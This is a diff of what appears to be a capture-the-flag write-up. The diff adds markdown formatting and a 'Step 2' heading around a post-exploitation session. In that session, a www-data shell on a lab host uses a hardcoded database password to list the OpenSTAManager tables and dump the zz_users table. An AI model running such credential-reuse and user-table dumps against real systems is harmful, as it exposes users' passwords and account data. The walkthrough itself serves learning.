@@ -1284,6 +1284,17 @@ Database
 information_schema
 openstamanager
 performance_schema
+```
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### Step 2 — List all tables inside the target database:
+
+```shell
 www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; show tables;" 2>/dev/null
 <' -e "use openstamanager; show tables;" 2>/dev/null
 Tables_in_openstamanager
@@ -1508,6 +1519,9 @@ zz_views
 zz_views_lang
 zz_widgets
 zz_widgets_lang
+```
+
+```
 www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null
 <penstamanager; select * from zz_users;" 2>/dev/null
 id      username        password        email   idanagrafica    idgruppo        enabled created_at      updated_at      reset_token        image_file_id   options
